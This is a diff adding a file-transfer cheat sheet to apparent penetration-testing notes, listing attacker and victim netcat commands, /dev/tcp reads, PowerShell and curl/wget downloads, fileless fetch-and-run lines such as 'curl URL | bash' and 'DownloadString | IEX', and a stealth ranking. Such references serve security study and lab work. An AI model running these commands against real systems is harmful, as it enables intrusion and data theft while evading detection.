@@ -328,3 +328,117 @@ These techniques are extremely useful in:
 💡 Don’t rely on just one method.  
 💡 Environment restrictions determine your approach.
 
+### Cheatsheet
+# 📦 File Transfer Methods – Table Cheat Sheet
+---
+
+## 🔹 Universal File Transfer Quick Reference
+
+|Method|OS|Direction|Listener Location|Default Port|Stealth Level|Requirements|Example Command|
+|---|---|---|---|---|---|---|---|
+|Netcat (nc)|Linux/Windows|Upload/Download|Either|Custom|Medium|nc installed|`nc -l -p 8000 > file`|
+|Ncat|Linux/Windows|Upload/Download|Either|Custom|Medium|ncat installed|`ncat --send-only IP PORT < file`|
+|`/dev/tcp`|Linux|Download|Attacker|Custom|Medium|Bash ≥ 2.04|`cat < /dev/tcp/IP/PORT > file`|
+|PowerShell WebClient|Windows|Download|Attacker|80/443|Low|PowerShell|`(New-Object Net.WebClient).DownloadFile()`|
+|PowerShell Remoting|Windows|Upload/Download|Remote Host|5985/5986|High|Admin + WinRM|`Copy-Item -ToSession`|
+|SMB (Impacket)|Windows/Linux|Upload/Download|Attacker|445|Medium|SMB allowed|`copy \\IP\share\file`|
+|FTP|Windows/Linux|Upload/Download|Either|21|Low|FTP allowed|`ftp -v -n -s:file.txt`|
+|RDP Drive Mount|Windows|Upload/Download|N/A (GUI)|3389|High|RDP access|`/drive:local,/path`|
+|SCP|Linux|Upload/Download|Either|22|High|SSH allowed|`scp file user@IP:/path`|
+|wget|Linux|Download|Attacker|80/443|Low|wget installed|`wget URL -O file`|
+|curl|Linux|Download|Attacker|80/443|Low|curl installed|`curl -o file URL`|
+|Python one-liner|Linux/Windows|Download|Attacker|80/443|Medium|Python installed|`python3 -c 'urllib...'`|
+|PHP one-liner|Linux|Download|Attacker|80/443|Medium|PHP installed|`php -r 'file_get_contents()'`|
+|Ruby|Linux|Download|Attacker|80/443|Medium|Ruby installed|`ruby -e 'Net::HTTP...'`|
+|Perl|Linux|Download|Attacker|80/443|Medium|Perl installed|`perl -e 'getstore()'`|
+|Base64 Copy/Paste|Linux/Windows|Upload/Download|N/A|None|Very High|Terminal access|`cat file|
+
+---
+
+# 🔹 Netcat / Ncat Quick Commands
+
+|Scenario|Listener|Sender|
+|---|---|---|
+|Victim listens|`nc -l -p 8000 > file`|`nc IP 8000 < file`|
+|Attacker listens|`nc -l -p 443 -q 0 < file`|`nc IP 443 > file`|
+|Ncat receive|`ncat -l -p 8000 --recv-only > file`|`ncat --send-only IP 8000 < file`|
+
+---
+
+# 🔹 PowerShell Quick Reference
+
+|Action|Command|
+|---|---|
+|Download File|`(New-Object Net.WebClient).DownloadFile('URL','file')`|
+|Fileless Execute|`(New-Object Net.WebClient).DownloadString('<URL>') \| IEX`|
+|Invoke-WebRequest|`iwr URL -OutFile file`|
+|WinRM Session|`$s = New-PSSession -ComputerName HOST`|
+|Upload via WinRM|`Copy-Item file -ToSession $s -Destination C:\`|
+|Download via WinRM|`Copy-Item file -FromSession $s -Destination C:\`|
+
+---
+
+# 🔹 Linux Web Download Cheat Sheet
+
+|Tool|Command|
+|---|---|
+|wget|`wget URL -O file`|
+|curl|`curl -o file URL`|
+|Fileless wget|`wget -qO- URL \| bash`|
+|Fileless curl|`curl URL \| bash`|
+
+---
+
+# 🔹 Base64 Transfer (No Network Required)
+
+### Encode (Linux)
+
+```
+cat file | base64 -w 0
+```
+
+### Decode (Linux)
+
+```
+echo BASE64STRING | base64 -d > file
+```
+
+### Decode (PowerShell)
+
+```powershell
+[IO.File]::WriteAllBytes("file",[Convert]::FromBase64String("STRING"))
+```
+
+---
+
+# 🔹 When to Use What
+
+|Environment Restriction|Best Method|
+|---|---|
+|Only HTTP/HTTPS allowed|curl / wget / PowerShell|
+|No HTTP but raw TCP allowed|Netcat|
+|No nc installed|`/dev/tcp`|
+|Admin on Windows|PowerShell Remoting|
+|SSH allowed|SCP|
+|GUI access available|RDP mount|
+|Everything blocked|Base64 copy/paste|
+
+---
+
+# 🔹 Stealth Ranking (From Most to Least Stealthy)
+
+1. Base64 copy/paste
+    
+2. PowerShell Remoting
+    
+3. SCP (SSH encrypted)
+    
+4. RDP drive mount
+    
+5. Netcat raw TCP
+    
+6. HTTP downloads
+    
+7. FTP (least stealthy)
+---
+
